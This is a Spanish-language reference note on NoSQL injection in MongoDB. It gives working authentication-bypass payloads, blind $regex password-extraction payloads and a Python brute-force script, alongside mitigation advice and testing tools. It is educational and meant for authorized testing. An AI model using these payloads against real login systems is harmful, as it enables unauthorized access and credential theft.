---
tags:
  - seguridad-web
  - owasp
  - nosqli
aliases:
  - NoSQLi
  - Inyección NoSQL
---

# Inyección NoSQL

**La inyección NoSQL** permite a un atacante manipular las consultas que la aplicación lanza contra una base de datos NoSQL (MongoDB, etc.) inyectando entrada maliciosa, normalmente operadores en cuerpos JSON o parámetros. Aunque no usa sintaxis SQL, puede derivar en filtrado de datos y bypass de autenticación.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

Ocurre cuando la aplicación construye la consulta NoSQL incrustando entrada del usuario sin validar. En MongoDB se abusa de operadores como `$ne`, `$gt`, `$lt`, `$regex`, `$in` o `$where`.

| Operador | Significado |
|---|---|
| `$ne` | distinto de |
| `$regex` | expresión regular |
| `$gt` / `$lt` | mayor / menor que |
| `$nin` | no está en |

Si una búsqueda ejecuta `db.products.find({ "price": userInput })` y el atacante envía `{ "$gt": 0 }`, la consulta devuelve todos los productos con precio mayor que cero, filtrando datos.

## Detección y pruebas

- Inyectar operadores donde se espera un valor escalar y observar si cambia el comportamiento.
- Probar variantes en cuerpo JSON y en cuerpo urlencoded (notación `param[$ne]=x`).
- Para WAFs: en MongoDB, ante claves duplicadas prevalece la última (`{"id":"10","id":"100"}` → `100`), útil para esquivar precondiciones.

## Explotación / payloads

### Bypass de autenticación

Formato HTTP (urlencoded):

```ps1
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
```

Formato JSON:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### Extracción de datos (blind con $regex)

Se infiere el valor carácter a carácter según la respuesta:

```ps1
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.*
```

```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
{"username":{"$in":["admin","root","administrator"]},"password":{"$gt":""}}
```

### Blind automatizado (JSON)

```python
import requests, string
username, password = "admin", ""
url = "http://example.com/login"
headers = {"content-type": "application/json"}
while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
            if 'OK' in r.text or r.status_code == 302:
                password += c
                print("Carácter encontrado:", password)
```

## Mitigación

- **Validar y forzar tipos** de la entrada: rechazar objetos/operadores donde se espera una cadena o número.
- **Sanear** caracteres como `$` y `.` en claves de objetos antes de pasarlos a la base de datos.
- Usar **consultas parametrizadas / capas ODM** que no interpreten entrada cruda como operadores.
- **Mínimo privilegio** en la cuenta de base de datos y desactivar `$where` / ejecución de JavaScript si no se necesita.
- No exponer mensajes de error de la base de datos.

## Herramientas

- **NoSQLMap** — enumeración y explotación automática de NoSQLi.
- **nosqlilab** — laboratorio para practicar NoSQLi.
- **Burp-NoSQLiScanner** — extensión de Burp para detectar NoSQLi.

---
🔗 Relacionado: [[Inyección SQL (SQLi)]] · [[Inyección LDAP]] · [[Inyección XPath]]
📚 Fuente: [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) (MIT, © Swissky)
